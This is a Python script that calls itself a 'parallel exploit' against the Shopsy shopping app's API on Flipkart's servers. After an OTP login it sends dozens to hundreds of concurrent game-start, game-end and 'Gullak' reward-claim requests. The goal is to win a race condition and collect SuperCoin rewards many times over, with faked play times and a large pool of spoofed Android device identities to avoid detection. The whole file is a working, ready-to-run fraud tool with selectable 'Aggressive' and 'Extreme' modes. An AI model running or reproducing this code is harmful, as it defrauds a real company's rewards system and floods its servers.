#!/usr/bin/env python3
"""
Parallel exploit with asyncio – 200+ parallel games possible!
Fresh login every run. No session saved.
Now with a LARGE pool of realistic Android devices (>500 combinations).
"""

import sys
import time
import argparse
import asyncio
import aiohttp
import json
import uuid
import random
from typing import Any, List, Dict, Optional
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

# ============================================================
#  LARGE DEVICE POOL – GENERATED DYNAMICALLY
# ============================================================

# ----- Base data -----
BRANDS_MODELS = {
    "samsung": [
        "SM-S918B", "SM-S911B", "SM-A546B", "SM-A346B", "SM-A256B",
        "SM-F946B", "SM-F936B", "SM-N986B", "SM-N976B", "SM-G998B",
        "SM-G996B", "SM-G991B", "SM-A736B", "SM-A536B", "SM-A226B",
        "SM-M536B", "SM-M336B", "SM-T970", "SM-X900", "SM-X800"
    ],
    "Google": [
        "Pixel 8 Pro", "Pixel 8", "Pixel 7 Pro", "Pixel 7", "Pixel 6 Pro",
        "Pixel 6", "Pixel 5", "Pixel 4 XL", "Pixel 4"
    ],
    "OnePlus": [
        "OnePlus 12", "OnePlus 11", "OnePlus 10 Pro", "OnePlus 9 Pro",
        "OnePlus 9", "OnePlus 8T", "OnePlus 8", "OnePlus Nord 3",
        "OnePlus Nord 2"
    ],
    "Xiaomi": [
        "Xiaomi 13 Pro", "Xiaomi 13", "Xiaomi 12 Pro", "Xiaomi 12",
        "Xiaomi 11T Pro", "Xiaomi 11T", "Xiaomi 11 Lite",
        "Redmi Note 12 Pro", "Redmi Note 11 Pro", "Redmi K50 Pro",
        "Poco F5", "Poco X5 Pro"
    ],
    "OPPO": [
        "Find X6 Pro", "Find X5 Pro", "Find X3 Pro",
        "Reno 10 Pro", "Reno 9 Pro", "Reno 8 Pro",
        "A98", "A78", "A58"
    ],
    "Vivo": [
        "X90 Pro", "X80 Pro", "X70 Pro",
        "V27 Pro", "V25 Pro", "V23 Pro",
        "Y100", "Y75", "Y55"
    ],
    "Realme": [
        "GT Neo 5", "GT Neo 3", "GT 2 Pro",
        "Realme 10 Pro", "Realme 9 Pro", "Realme 8 Pro",
        "Realme C55", "Realme C33"
    ],
    "Motorola": [
        "Moto Edge 40 Pro", "Moto Edge 30 Pro", "Moto Edge 20 Pro",
        "Moto G84", "Moto G73", "Moto G53",
        "Moto E32", "Moto E13"
    ],
    "Nothing": [
        "Nothing Phone (2)", "Nothing Phone (1)"
    ],
    "Asus": [
        "Zenfone 10", "Zenfone 9", "ROG Phone 7", "ROG Phone 6"
    ],
    "Sony": [
        "Xperia 1 V", "Xperia 5 V", "Xperia 10 V"
    ]
}

# ----- Android versions and build numbers -----
ANDROID_VERSIONS = ["12", "13", "14", "15"]
BUILD_BASE = {
    "12": "SP1A.210812.016",
    "13": "TP1A.220624.014",
    "14": "UP1A.231005.007",
    "15": "AP4A.240305.003"
}
BUILD_SUFFIXES = ["", ".A1", ".B1", ".C1", ".D1"]
APP_VERSIONS = ["2291175", "2291176", "2291177", "2291178", "2291179"]

def generate_device_pool() -> List[Dict[str, str]]:
    pool = []
    used = set()
    for brand, models in BRANDS_MODELS.items():
        for model in models:
            for os_ver in ANDROID_VERSIONS:
                build_base = BUILD_BASE.get(os_ver, "TP1A.220624.014")
                suffix = random.choice(BUILD_SUFFIXES)
                build = build_base + suffix
                app_ver = random.choice(APP_VERSIONS)
                device = {
                    "brand": brand,
                    "model": model,
                    "os_version": os_ver,
                    "build": build,
                    "app_version": app_ver
                }
                key = f"{brand}|{model}|{os_ver}|{build}"
                if key not in used:
                    used.add(key)
                    pool.append(device)
    return pool

DEVICE_POOL = generate_device_pool()

def get_random_device() -> Dict[str, str]:
    return random.choice(DEVICE_POOL)

# ============================================================
#  CORE CLASSES (ShopsyClient, AsyncShopsyClient, etc.)
# ============================================================

# --- GAMES ---
GAMES = [
    {"id": "runner-3d", "name": "Super Runner", "play_time": 94, "gems": 200},
    {"id": "city-builder", "name": "City Builder", "play_time": 47, "gems": 100},
    {"id": "match-3", "name": "Fruit Crush", "play_time": 35, "gems": 100},
    {"id": "goods-triple", "name": "Grocery Match", "play_time": 40, "gems": 100},
    {"id": "ludo", "name": "Ludo", "play_time": 50, "gems": 100},
    {"id": "nazaria", "name": "Nazar Pop", "play_time": 45, "gems": 100},
]

# --- LiveLog ---
class LiveLog:
    def __init__(self, debug: bool = False):
        self.debug = debug
        self.start = time.time()
    def _ts(self):
        return datetime.now().strftime("%H:%M:%S")
    def _elapsed(self):
        sec = int(time.time() - self.start)
        return f"{sec // 60:02d}:{sec % 60:02d}"
    def info(self, msg):
        print(f"[{self._ts()} | {self._elapsed()}] {msg}", flush=True)
    def ok(self, msg):
        print(f"[{self._ts()} | {self._elapsed()}] [+] {msg}", flush=True)
    def warn(self, msg):
        print(f"[{self._ts()} | {self._elapsed()}] [!] {msg}", flush=True)
    def dbg(self, msg, data=None):
        if not self.debug:
            return
        print(f"[{self._ts()} | {self._elapsed()}] [DEBUG] {msg}", flush=True)
        if data is not None:
            text = json.dumps(data, ensure_ascii=False, indent=2) if isinstance(data, (dict, list)) else str(data)
            if len(text) > 1200:
                text = text[:1200] + "\n... (truncated)"
            print(text, flush=True)
    def countdown(self, label, seconds):
        for remaining in range(seconds, 0, -1):
            print(f"\r[{self._ts()} | {self._elapsed()}] {label} ... {remaining}s ", end="", flush=True)
            time.sleep(1)
        print(f"\r[{self._ts()} | {self._elapsed()}] {label} ... done!          ", flush=True)

# --- ShopsySession ---
@dataclass
class ShopsySession:
    device_id: str = field(default_factory=lambda: uuid.uuid4().hex)
    visit_id: str = field(default_factory=lambda: f"{uuid.uuid4().hex}-{int(time.time() * 1000)}")
    dc_id: str = "1"
    at: str = ""
    sn: str = ""
    vid: str = ""
    secure_token: str = ""
    secure_cookie: str = ""
    account_id: str = ""
    user_name: str = ""
    is_logged_in: bool = False

    def save(self):
        pass

    @classmethod
    def load(cls):
        return None

# --- ShopsyClient (base) ---
class ShopsyClient:
    def __init__(self, log=None, fast=True):
        self.log = log or LiveLog()
        self.fast = fast
        self.ctx = ShopsySession()
        self._user_cache = None

    def _game_already_done(self, game_id, user):
        for g in user.get("gameStats", {}).get("games", []):
            if g.get("gameId") == game_id and g.get("rewards", {}).get("isMaxGameBonusEarned"):
                return True
        return False

    def print_summary(self):
        print("\n" + "=" * 56)
        print("  SUPERCOIN SUMMARY")
        print("=" * 56)
        print(f"  Account: {self.ctx.account_id}")
        print(f"  DC: {self.ctx.dc_id}")
        print("=" * 56)

# --- Constants ---
DEFAULT_PARALLEL = 50
DEFAULT_START_SLEEP = 0.0
DEFAULT_BURST_DELAY = 0.0
DEFAULT_GULLAK = True
DEFAULT_ALL_GAMES = True
DEFAULT_SLOW = False
DEFAULT_DEBUG = True

ROME_TEMPLATE = "https://{dc}.rome.api.flipkart.net"
DEFAULT_PINCODE = "226001"
FAST_PLAY_SEC = 18

def _extract_dc_id(data: Dict[str, Any], http_status: int) -> Optional[str]:
    is_dc = http_status == 406 or data.get("STATUS_CODE") == 406
    if not is_dc:
        return None
    if data.get("ERROR_MESSAGE") != "DC Change" and data.get("ERROR_CODE") != 2000:
        return None
    dc_info = (data.get("META_INFO") or {}).get("dcInfo") or data.get("RESPONSE") or {}
    dc_id = dc_info.get("id")
    return str(dc_id) if dc_id else None

# ============================================================
#  ASYNC CLIENT WITH SESSION RESTORE & DEVICE ROTATION
# ============================================================
class AsyncShopsyClient(ShopsyClient):
    def __init__(self, *args, device: Optional[Dict[str, str]] = None, session_data: Optional[Dict] = None, **kwargs):
        super().__init__(*args, **kwargs)

        if device is None:
            device = get_random_device()
        self.device = device

        # If session_data provided, restore; else create fresh
        if session_data:
            self.ctx = ShopsySession()  # create empty
            self.ctx.dc_id = session_data.get("dc_id", "1")
            self.ctx.at = session_data.get("at", "")
            self.ctx.sn = session_data.get("sn", "")
            self.ctx.vid = session_data.get("vid", "")
            self.ctx.secure_token = session_data.get("secure_token", "")
            self.ctx.secure_cookie = session_data.get("secure_cookie", "")
            self.ctx.account_id = session_data.get("account_id", "")
            self.ctx.user_name = session_data.get("user_name", "")
            self.ctx.is_logged_in = session_data.get("is_logged_in", False)
            self.ctx.device_id = session_data.get("device_id", uuid.uuid4().hex)
            self.ctx.visit_id = session_data.get("visit_id", f"{uuid.uuid4().hex}-{int(time.time() * 1000)}")
            self.ctx.save = lambda: None
        else:
            self.ctx = ShopsySession()

        self._user_cache = None
        self.ctx.save = lambda: None
        self.save = lambda: None
        self._session: Optional[aiohttp.ClientSession] = None
        self._last_dc_meta: Optional[Dict[str, Any]] = None

        self._sync_urls()
        self._partner_headers = self._partner_headers_impl
        self._game_headers = self._game_headers_impl
        self._path_from_url = self._path_from_url_impl

        self.log.info(f"🔄 Device: {self.device['brand']} {self.device['model']} (OS {self.device['os_version']})")

    async def __aenter__(self):
        connector = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            enable_cleanup_closed=True
        )
        self._session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30)
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self._session:
            await self._session.close()

    def _sync_urls(self):
        self.base_url = ROME_TEMPLATE.format(dc=self.ctx.dc_id)

    def _url(self, path: str) -> str:
        return f"{self.base_url}{path}"

    @staticmethod
    def _path_from_url_impl(url: str) -> str:
        for path in ("/4/page/fetch", "/1/action/view", "/1/shopsy/games"):
            if path in url:
                return path
        if url.startswith("http"):
            idx = url.find("/", 8)
            return url[idx:] if idx != -1 else url
        return url

    def _partner_headers_impl(self, *, layout: bool = False) -> Dict[str, str]:
        headers = {
            "User-Agent": "okhttp/4.9.2",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "X-PARTNER-CONTEXT": '{"source":"reseller"}',
            "FK-TENANT-ID": "SHOPSY",
            "business": "reseller",
            "X-User-Agent": self.x_user_agent,
            "X-Visit-Id": self.ctx.visit_id,
            "X-NewRelic-ID": "VwEHU1dSCxABUVlaAAQHU1UA",
        }
        if layout:
            headers["X-Layout-Version"] = '{"appVersion":"910000","frameworkVersion":"1.0"}'
        if self.ctx.at:
            headers["at"] = self.ctx.at
        if self.ctx.sn:
            headers["sn"] = self.ctx.sn
        if self.ctx.secure_token:
            headers["secureToken"] = self.ctx.secure_token
        if self.ctx.secure_cookie:
            headers["secureCookie"] = self.ctx.secure_cookie
        return headers

    def _game_headers_impl(self) -> Dict[str, str]:
        return {
            "User-Agent": "okhttp/4.9.2",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "x-user-agent": self.x_user_agent,
            "sessionid": "session_id",
            "X-NewRelic-ID": "VwEHU1dSCxABUVlaAAQHU1UA",
        }

    @property
    def x_user_agent(self) -> str:
        device = self.device
        os_ver = device.get("os_version", "14")
        model = device["model"]
        brand = device["brand"]
        app_ver = device.get("app_version", "2291175")
        build = device.get("build", "TP1A.220624.014")
        return (
            f"Mozilla/5.0 (Linux; Android {os_ver}; {model} Build/{build}) "
            f"FKUA/Retail/{app_ver}/Android/Mobile "
            f"({brand}/{model}/{self.ctx.device_id})"
        )

    def _switch_dc(self, dc_id: str) -> None:
        if self.ctx.dc_id == dc_id:
            return
        old = self.ctx.dc_id
        self.ctx.dc_id = dc_id
        self._sync_urls()
        self.ctx.save()
        self.log.info(f"DC Change: {old} -> {dc_id} | host={self.base_url}")

    def _capture_secure_cookie(self, response: aiohttp.ClientResponse) -> None:
        secure_cookie = response.headers.get("securecookie") or response.headers.get("secureCookie")
        if secure_cookie:
            self.ctx.secure_cookie = secure_cookie

    def _apply_session(self, data):
        session = data.get("SESSION") or {}
        if not session:
            return
        self.ctx.at = session.get("at") or self.ctx.at
        self.ctx.sn = session.get("sn") or self.ctx.sn
        self.ctx.vid = session.get("vid") or self.ctx.vid
        self.ctx.secure_token = session.get("secureToken") or self.ctx.secure_token
        self.ctx.account_id = session.get("accountId") or self.ctx.account_id
        self.ctx.is_logged_in = bool(session.get("isLoggedIn"))
        if session.get("firstName"):
            last = session.get("lastName") or ""
            self.ctx.user_name = f"{session['firstName']} {last}".strip()
        self.ctx.save()

    async def _post_json_async(
        self,
        url: str,
        payload: Dict[str, Any],
        *,
        game: bool = False,
        layout: bool = False,
    ) -> Dict[str, Any]:
        path = self._path_from_url_impl(url)
        for attempt in range(5):
            active_url = self._url(path)
            headers = self._game_headers_impl() if game else self._partner_headers_impl(layout=layout)
            if self._session is None:
                raise RuntimeError("Session not initialized. Use 'async with' context manager.")
            try:
                self.log.dbg(f"POST {active_url} (dc={self.ctx.dc_id}, try={attempt + 1})", payload)
                async with self._session.post(active_url, json=payload, headers=headers) as response:
                    self._capture_secure_cookie(response)
                    data = await response.json()
                    dc_id = _extract_dc_id(data, response.status)
                    if dc_id:
                        self._last_dc_meta = (data.get("META_INFO") or {}).get("dcInfo") or data.get("RESPONSE")
                        self._switch_dc(dc_id)
                        continue
                    self.log.dbg(f"Response HTTP {response.status}", data)
                    if not game:
                        self._apply_session(data)
                    if response.status >= 400 or (data.get("STATUS_CODE") or 200) >= 400:
                        err = data.get("ERROR_MESSAGE") or data
                        raise RuntimeError(f"HTTP {response.status}: {err}")
                    return data
            except aiohttp.ClientError as e:
                if attempt == 4:
                    raise RuntimeError(f"Request failed after 5 attempts: {e}")
                await asyncio.sleep(1 * (attempt + 1))
                continue
        raise RuntimeError("Max retry attempts exceeded")

    async def bootstrap_async(self) -> None:
        self.log.info(f"Session bootstrap (DC {self.ctx.dc_id})...")
        payload = {
            "pageUri": "/shopsy2-login-page-store",
            "pageContext": {
                "pageHashKey": None,
                "slotContextMap": None,
                "paginationContextMap": None,
                "stateInfoMap": None,
                "slotIdInfoMap": None,
                "paginatedFetch": False,
                "pageNumber": 1,
                "fetchAllPages": False,
                "networkSpeed": 3000,
                "trackingContext": None,
                "fetchSeoData": False,
            },
            "partnerContext": None,
            "locationContext": {"pincode": DEFAULT_PINCODE},
            "requestContext": None,
        }
        data = await self._post_json_async(self._url("/4/page/fetch"), payload, layout=True)
        self.ctx.save()
        has_cookie = "yes" if self.ctx.secure_cookie else "no"
        self.log.ok(f"Bootstrap OK | dc={self.ctx.dc_id} | vid={self.ctx.vid or 'N/A'} | cookie={has_cookie}")

    async def send_otp_async(self, phone: str) -> str:
        phone = phone.strip().replace("+91", "").replace(" ", "")
        self.log.info(f"OTP bheja ja raha hai: +91{phone}")
        payload = {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY_SHOPSY2",
                "loginId": phone,
                "loginIdPrefix": "+91",
                "phoneNumberFormat": "E164",
                "addAppHash": True,
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "sourceContext": "DEFAULT",
                "clientQueryParamMap": None,
            }
        }
        data = await self._post_json_async(self._url("/1/action/view"), payload)
        response_ctx = data.get("RESPONSE", {}).get("actionResponseContext", {})
        if not data.get("RESPONSE", {}).get("actionSuccess"):
            raise RuntimeError(f"OTP send fail: {data}")
        request_id = response_ctx.get("requestId")
        if not request_id:
            attempts = response_ctx.get("remainingAttempts")
            ctx_type = response_ctx.get("type", "")
            if attempts == 0 or ctx_type == "LOGIN_VERIFY":
                raise RuntimeError("OTP nahi bheja — galat number ya 24h limit.")
            raise RuntimeError(f"OTP requestId nahi mila: {response_ctx}")
        self.log.ok(f"OTP bhej diya | requestId={request_id[:12]}...")
        return request_id

    async def verify_otp_async(self, phone: str, otp: str, otp_request_id: str) -> None:
        phone = phone.strip().replace("+91", "").replace(" ", "")
        self.log.info("OTP verify ho raha hai...")
        payload = {
            "actionRequestContext": {
                "type": "LOGIN_SHOPSY2",
                "loginId": phone,
                "loginIdPrefix": "+91",
                "password": None,
                "otp": otp.strip(),
                "otpRequestId": otp_request_id,
                "remainingAttempts": 5,
                "phoneNumberFormat": "E164",
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "sourceContext": "DEFAULT",
                "churned": False,
                "otpRegex": None,
                "data": None,
                "clientQueryParamMap": None,
            }
        }
        data = await self._post_json_async(self._url("/1/action/view"), payload)
        response_ctx = data.get("RESPONSE", {}).get("actionResponseContext", {})
        if not response_ctx.get("authenticationSuccess"):
            raise RuntimeError(f"Login fail: {data}")
        self.log.ok(f"Login OK | account={self.ctx.account_id} | name={self.ctx.user_name or 'User'}")

    async def games_api_async(self, route_uri: str, method: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        body = {"requestMethod": method, "routeUri": route_uri, "payload": payload}
        return await self._post_json_async(self._url("/1/shopsy/games"), body, game=True)

    async def get_user_async(self, *, refresh: bool = False) -> Dict[str, Any]:
        if not self.ctx.account_id:
            raise RuntimeError("Account ID missing — pehle login karo")
        if self._user_cache and not refresh:
            return self._user_cache
        data = await self.games_api_async(
            "user/get-user",
            "GET",
            {"userId": self.ctx.account_id, "userName": self.ctx.user_name or "User"},
        )
        if not data.get("success"):
            raise RuntimeError(f"get-user fail: {data}")
        self._user_cache = data["data"]
        return self._user_cache

    async def start_game_async(self, game: Dict[str, Any]) -> str:
        start = await self.games_api_async(
            "game/game-started",
            "POST",
            {"userId": self.ctx.account_id, "gameId": game["id"]},
        )
        if not start.get("success"):
            raise RuntimeError(f"Game start failed: {start}")
        return start["data"]["sessionId"]

    async def end_game_async(self, game: Dict[str, Any], session_id: str, play_time: int) -> Dict[str, Any]:
        return await self.games_api_async(
            "game/game-ended",
            "POST",
            {
                "userId": self.ctx.account_id,
                "gameId": game["id"],
                "sessionId": session_id,
                "gemsEarned": game["gems"],
                "playTimeInSec": play_time,
            },
        )

    async def _play_seconds_async(self, game: Dict[str, Any]) -> int:
        if not self.fast:
            return game["play_time"]
        if game["play_time"] >= 60:
            return game["play_time"]
        return min(game["play_time"], FAST_PLAY_SEC)

    async def claim_gullak_async(self, label: str = "Gullak") -> Optional[Dict[str, Any]]:
        self.log.info(f"{label} claim (SuperCoin)...")
        data = await self.games_api_async(
            "gullak/claim-gullak",
            "POST",
            {"userId": self.ctx.account_id},
        )
        if not data.get("success"):
            err = data.get("data", {}).get("errorMessage") or data
            self.log.warn(f"{label} skip/fail: {err}")
            return None
        result = data["data"]
        self._user_cache = None
        self.log.ok(
            f"{label} | login={result.get('loginRewardCoinsClaimed', 0)} | "
            f"games={result.get('gameRewardCoinsClaimed', 0)} | "
            f"today={result.get('totalCoinsEarnedToday', 0)}"
        )
        return result

# ============================================================
#  PARALLEL EXPLOIT FUNCTIONS
# ============================================================

async def parallel_game_exploit_async(
    client: AsyncShopsyClient,
    game: Dict[str, Any],
    parallel_count: int,
    start_sleep: float,
    burst_delay: float,
) -> int:
    game_id = game["id"]
    name = game["name"]
    user = await client.get_user_async(refresh=True)
    if client._game_already_done(game_id, user):
        client.log.warn(f"⏭️ {name} already done today. Skipping.")
        return 0
    play_time = await client._play_seconds_async(game)
    client.log.warn(f"🔥 GAME EXPLOIT: {name} × {parallel_count} parallel requests")
    start_tasks = []
    for i in range(parallel_count):
        start_tasks.append(client.start_game_async(game))
        if start_sleep > 0:
            await asyncio.sleep(start_sleep)
    sessions = []
    start_results = await asyncio.gather(*start_tasks, return_exceptions=True)
    for i, result in enumerate(start_results):
        if isinstance(result, Exception):
            client.log.warn(f"Session {i} start failed: {result}")
        else:
            sessions.append(result)
    if not sessions:
        raise RuntimeError("No sessions could be started")
    if burst_delay > 0:
        client.log.info(f"Waiting {burst_delay}s before burst...")
        await asyncio.sleep(burst_delay)
    client.log.info(f"Started {len(sessions)} sessions. Sending END requests in parallel...")
    end_tasks = [
        client.end_game_async(game, session, play_time)
        for session in sessions
    ]
    total_coins = 0
    success_count = 0
    for future in asyncio.as_completed(end_tasks):
        try:
            result = await future
            if result.get("success"):
                coins = result["data"].get("coinsEarnedForGame", 0)
                total_coins += coins
                success_count += 1
                client.log.ok(f"Session +{coins} coins")
            else:
                client.log.warn(f"Session failed: {result}")
        except Exception as e:
            client.log.warn(f"Session error: {e}")
    client._user_cache = None
    client.log.ok(
        f"✅ GAME EXPLOIT DONE: {success_count}/{len(sessions)} successful | "
        f"Total coins from this game: {total_coins}"
    )
    return total_coins

async def parallel_gullak_exploit_async(
    client: AsyncShopsyClient,
    parallel_count: int,
) -> int:
    client.log.warn(f"🔥 GULLAK EXPLOIT: {parallel_count} parallel claims")
    tasks = [
        client.claim_gullak_async(f"Gullak {i+1}")
        for i in range(parallel_count)
    ]
    total_coins = 0
    success_count = 0
    for future in asyncio.as_completed(tasks):
        try:
            result = await future
            if result:
                coins = result.get("loginRewardCoinsClaimed", 0) + result.get("gameRewardCoinsClaimed", 0)
                total_coins += coins
                success_count += 1
        except Exception as e:
            client.log.warn(f"Gullak claim error: {e}")
    client.log.ok(f"GULLAK EXPLOIT: {success_count} claims, total coins: {total_coins}")
    return total_coins

async def run_all_games_async(
    client: AsyncShopsyClient,
    parallel_configs: Dict[str, int],
    start_sleep: float,
    burst_delay: float,
) -> int:
    total = 0
    for game in GAMES:
        game_id = game["id"]
        parallel_count = parallel_configs.get(game_id, DEFAULT_PARALLEL)
        if parallel_count <= 0:
            client.log.info(f"Skipping {game['name']} (0 parallel count)")
            continue
        try:
            coins = await parallel_game_exploit_async(
                client, game, parallel_count, start_sleep, burst_delay
            )
            total += coins
        except Exception as e:
            client.log.warn(f"Error on {game['name']}: {e}")
        await asyncio.sleep(1)
    return total

def get_parallel_configs() -> Dict[str, int]:
    print("\n" + "=" * 56)
    print("  PARALLEL CONFIGURATION PER GAME")
    print("=" * 56)
    configs = {}
    for game in GAMES:
        game_id = game["id"]
        name = game["name"]
        while True:
            try:
                prompt = f"\n{name} ({game_id}) parallel count [default {DEFAULT_PARALLEL}]: "
                response = input(prompt).strip()
                if not response:
                    count = DEFAULT_PARALLEL
                else:
                    count = int(response)
                if count < 0:
                    print("❌ Count cannot be negative. Enter 0 to skip.")
                    continue
                configs[game_id] = count
                if count == 0:
                    print(f"⏭️ Skipping {name}")
                elif count <= 10:
                    print(f"🛡️ {name}: {count} sessions (Safe mode)")
                elif count <= 30:
                    print(f"⚖️ {name}: {count} sessions (Balanced mode)")
                elif count <= 100:
                    print(f"⚡ {name}: {count} sessions (Aggressive mode)")
                else:
                    print(f"💀 {name}: {count} sessions (Extreme mode!)")
                break
            except ValueError:
                print("❌ Please enter a valid number.")
    return configs

async def login_flow_async(client: AsyncShopsyClient, phone: Optional[str] = None) -> None:
    await client.bootstrap_async()
    if not phone:
        phone = input("\nMobile number (+91): ").strip().replace("+91", "")
    if len(phone) != 10 or not phone.isdigit():
        raise ValueError("Valid 10-digit mobile number daalo")
    request_id = await client.send_otp_async(phone)
    otp = input("OTP enter karo: ").strip()
    if len(otp) != 6 or not otp.isdigit():
        raise ValueError("Valid 6-digit OTP daalo")
    await client.verify_otp_async(phone, otp, request_id)

async def main_async():
    parser = argparse.ArgumentParser(description="Shopsy parallel exploit with asyncio")
    parser.add_argument("--game", help="Game ID to exploit (default: all games)")
    parser.add_argument("--start-sleep", type=float, default=DEFAULT_START_SLEEP)
    parser.add_argument("--burst-delay", type=float, default=DEFAULT_BURST_DELAY)
    parser.add_argument("--gullak", action="store_true", default=DEFAULT_GULLAK)
    parser.add_argument("--slow", action="store_true", default=DEFAULT_SLOW)
    parser.add_argument("--debug", action="store_true", default=DEFAULT_DEBUG)
    parser.add_argument("--non-interactive", action="store_true")
    args = parser.parse_args()

    parallel_configs = {}
    if args.non_interactive:
        for game in GAMES:
            parallel_configs[game["id"]] = DEFAULT_PARALLEL
    else:
        if args.game:
            game = next((g for g in GAMES if g["id"] == args.game), None)
            if not game:
                print(f"❌ Unknown game: {args.game}")
                print(f"Available: {[g['id'] for g in GAMES]}")
                return 1
            print(f"\nConfiguring parallel count for {game['name']} only...")
            while True:
                try:
                    response = input(f"Parallel count [default {DEFAULT_PARALLEL}]: ").strip()
                    count = int(response) if response else DEFAULT_PARALLEL
                    if count < 0:
                        print("❌ Count cannot be negative.")
                        continue
                    parallel_configs[args.game] = count
                    break
                except ValueError:
                    print("❌ Please enter a valid number.")
        else:
            parallel_configs = get_parallel_configs()

    log = LiveLog(debug=args.debug)
    print("=" * 56)
    print("  SHOPSY ASYNC PARALLEL EXPLOIT")
    print(f"  Start sleep: {args.start_sleep}s")
    print(f"  Burst delay: {args.burst_delay}s")
    print("  Parallel configs:")
    for game_id, count in parallel_configs.items():
        game_name = next((g["name"] for g in GAMES if g["id"] == game_id), game_id)
        print(f"    {game_name}: {count} sessions")
    if args.gullak:
        print("  Gullak: YES")
    print("=" * 56)

    async with AsyncShopsyClient(log=log, fast=not args.slow) as client:
        phone = input("\nMobile number (+91): ").strip()
        await login_flow_async(client, phone)
        if not client.ctx.is_logged_in:
            log.warn("Login failed")
            return 1
        total_coins = 0
        if args.game:
            game = next((g for g in GAMES if g["id"] == args.game), None)
            if game:
                count = parallel_configs.get(args.game, 0)
                if count > 0:
                    total_coins += await parallel_game_exploit_async(
                        client, game, count, args.start_sleep, args.burst_delay
                    )
                else:
                    log.info(f"Skipping {game['name']} (0 parallel count)")
        else:
            total_coins += await run_all_games_async(
                client, parallel_configs, args.start_sleep, args.burst_delay
            )
        if args.gullak:
            gullak_threads = 10
            log.info(f"Running Gullak exploit with {gullak_threads} parallel claims")
            total_coins += await parallel_gullak_exploit_async(client, gullak_threads)
        client.print_summary()
        log.ok(f"Total extra coins earned today (approx): {total_coins}")
    return 0

def main():
    try:
        return asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n[!] Cancelled")
        return 130
    except Exception as e:
        print(f"\n[!] Error: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
